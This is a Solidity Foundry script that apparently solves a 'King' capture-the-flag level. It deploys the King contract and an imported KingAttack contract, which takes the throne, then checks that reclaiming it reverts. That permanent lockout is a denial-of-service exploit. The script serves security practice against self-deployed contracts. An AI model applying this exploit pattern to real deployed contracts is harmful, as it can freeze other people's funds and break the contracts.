// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/King.sol";
import "../src/KingAttack.sol";

contract HackKing is Script {
    function run() external {
        vm.startBroadcast();

        // 1️⃣ Deploy King with initial prize
        King king = new King{value: 1 ether}();
        console.log("King deployed at:", address(king));
        console.log("Initial king:", king._king());
        console.log("Initial prize:", king.prize());

        // 2️⃣ Deploy KingAttack and take kingship
        KingAttack attack = new KingAttack{value: 2 ether}(address(king));
        console.log("KingAttack deployed at:", address(attack));
        console.log("Current king (should be KingAttack):", king._king());

        // 3️⃣ Test: try to reclaim kingship → MUST revert
        vm.expectRevert();
        (bool ok,) = address(king).call{value: 3 ether}("");
        require(ok, "This line should never be reached");

        vm.stopBroadcast();
    }
}
